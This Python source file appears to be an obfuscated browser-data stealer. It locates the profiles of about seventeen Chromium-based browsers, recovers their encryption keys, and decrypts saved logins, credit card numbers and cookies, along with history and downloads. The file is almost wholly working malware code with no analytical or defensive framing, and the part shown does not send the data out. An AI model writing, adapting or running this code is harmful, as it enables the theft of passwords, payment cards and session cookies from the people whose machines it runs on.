N='name'
M=False
K='\\History'
J='Expires On'
I='URL'
L='history'
H=True
F='decrypt'
E='columns'
D='file'
C='query'
import base64 as O,json,os as B,shutil as P,sqlite3 as Q
from datetime import datetime as R,timedelta as S
from Crypto.Cipher import AES
if B.name=='nt':from win32crypt import CryptUnprotectData as T
else:from Crypto.Protocol.KDF import PBKDF2 as U
A=B.getenv('LOCALAPPDATA')
if A is None:
    A=__file__
G={'avast':A+'\\AVAST Software\\Browser\\User Data','amigo':A+'\\Amigo\\User Data','torch':A+'\\Torch\\User Data','kometa':A+'\\Kometa\\User Data','orbitum':A+'\\Orbitum\\User Data','cent-browser':A+'\\CentBrowser\\User Data','7star':A+'\\7Star\\7Star\\User Data','sputnik':A+'\\Sputnik\\Sputnik\\User Data','vivaldi':A+'\\Vivaldi\\User Data','google-chrome-sxs':A+'\\Google\\Chrome SxS\\User Data','google-chrome':A+'\\Google\\Chrome\\User Data','epic-privacy-browser':A+'\\Epic Privacy Browser\\User Data','microsoft-edge':A+'\\Microsoft\\Edge\\User Data','uran':A+'\\uCozMedia\\Uran\\User Data','yandex':A+'\\Yandex\\YandexBrowser\\User Data','brave':A+'\\BraveSoftware\\Brave-Browser\\User Data','iridium':A+'\\Iridium\\User Data'}
V={'login_data':{C:'SELECT action_url, username_value, password_value FROM logins',D:'\\Login Data',E:[I,'Email','Password'],F:H},'credit_cards':{C:'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',D:'\\Web Data',E:['Name On Card','Card Number',J,'Added On'],F:H},'cookies':{C:'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',D:'\\Network\\Cookies',E:['Host Key','Cookie Name','Path','Cookie',J],F:H},L:{C:'SELECT url, title, last_visit_time FROM urls',D:K,E:[I,'Title','Visited Time'],F:M},'downloads':{C:'SELECT tab_url, target_path FROM downloads',D:K,E:['Download URL','Local Path'],F:M}}
def W(path):
	H='utf-8';G='\\Local State';F='os_crypt';E=None;C=path
	if B.name=='nt':
		if not B.path.exists(C):return
		if F not in open(C+G,'r',encoding=H).read():return
		with open(C+G,'r',encoding=H)as I:J=I.read()
		K=json.loads(J);A=O.b64decode(K[F]['encrypted_key']);A=A[5:];A=T(A,E,E,E,0)[1];return A
	else:L=b'saltysalt';P=b' '*16;M=16;D='peanuts';D=D.encode('utf8');N=1;A=U(D,L,M,N);return A
	Q=cipher.decrypt(encrypted_value)
def X(buff,key):B=buff[3:15];C=buff[15:];D=AES.new(key,AES.MODE_GCM,B);A=D.decrypt(C);A=A[:-16].decode();return A
def Y(path,profile,key,type_of_data):
	K='temp_db';G=type_of_data;H=f"{path}\\{profile}{G[D]}"
	if not B.path.exists(H):return
	I=[]
	try:
		P.copy(H,K);M=Q.connect(K);O=M.cursor();O.execute(G[C])
		for A in O.fetchall():
			A=list(A)
			if G[F]:
				for J in range(len(A)):
					if isinstance(A[J],bytes):A[J]=X(A[J],key)
			if G[N]==L:
				if A[2]!=0:A[2]=Z(A[2])
				else:A[2]='0'
			I.append(dict(zip(G[E],A)))
		M.close();B.remove(K)
	except PermissionError:I.append({'Error':f"Permission denied: {H}"})
	return I
def Z(chrome_time):return(R(1601,1,1)+S(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
def a():
	A=[]
	for C in G.keys():
		if B.path.exists(G[C]):A.append(C)
	return A
def main():
	A={};F=a()
	for B in F:
		C=G[B];H=W(C);A[B]={}
		for(D,E)in V.items():E[N]=D;I=Y(C,'Default',H,E);A[B][D]=I
	return A